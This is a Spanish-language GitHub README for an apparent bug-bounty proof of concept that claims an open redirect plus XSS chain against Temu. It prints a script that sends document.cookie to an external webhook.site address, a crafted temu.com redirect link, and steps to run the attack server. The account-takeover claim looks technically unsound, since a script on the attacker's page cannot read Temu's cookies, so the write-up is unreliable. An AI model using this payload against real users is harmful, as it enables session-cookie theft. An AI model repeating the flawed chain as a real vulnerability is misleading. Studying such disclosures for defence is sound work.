# 🛡️ temu-vuln-hunter-pro

> PoC profesional para explotar una vulnerabilidad crítica de Open Redirect + XSS reflejado en **Temu**, demostrando robo de cookies y escalada a toma de cuenta.

---

## 🚨 Descripción

Este proyecto demuestra una cadena de ataque real combinando:

#- ✅ Redirección abierta (`open redirect`)
#- ✅ XSS reflejado desde servidor externo
#- ✅ Robo de cookies vía JavaScript malicioso
#- ✅ Potencial toma de control de cuentas Temu

---

## 🔍 Estructura del Proyecto

temu-vuln-hunter-pro/
├── public/
│ └── poc.html # Página maliciosa que roba cookies
├── server.py # Servidor Flask que simula redirección
├── requirements.txt # Dependencias del proyecto
├── docs/
│ └── report.txt # Informe técnico completo para HackerOne
└── README.md # Este documento

---

## 💥 Payload usado

```html
<script>
fetch("https://webhook.site/32a0eb40-6f73-46d8-ae79-42f7535375e2", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({ cookie: document.cookie })
});
</script>
Este payload se ejecuta en poc.html después de que Temu redirige al atacante.

#🧪 Pasos para Reproducir

Visita este enlace:

https://www.temu.com/universal-link?redirect=https://temu-vuln-hunter-pro.vercel.app/redirect?url=https://webhook.site/...
El sistema redirige automáticamente al dominio del atacante.

Se ejecuta código malicioso en poc.html y la cookie se envía a un webhook externo.

#⚙️ Requisitos para correr localmenter

# Clonar el repositorio

git clone https://github.com/Jonathanjimenez123/temu-vuln-hunter-pro.git
cd temu-vuln-hunter-pro

# Instalar dependencias

pip install -r requirements.txt

# Ejecutar servidor Flask

python server.py

#📄 Reporte Técnico

Consulta el archivo docs/report.txt para ver el informe completo enviado a HackerOne, incluyendo impacto, PoC y solución sugerida.

#🧠 Autor Jonathan Jiménez
#💻 Alias HackerOne: jimenez7
#✉️  Email: jimenez7@wearehackerone.com

#⚠️ Disclaimer

Este proyecto es una prueba de concepto creada únicamente con fines educativos y de investigación. No está destinado a usarse con fines maliciosos. Todo reporte se ha hecho bajo los lineamientos éticos del programa HackerOne.

>>>>>>> 14b4965 (🚨 PoC crítica: Open Redirect + XSS + Account takeover en Temu)
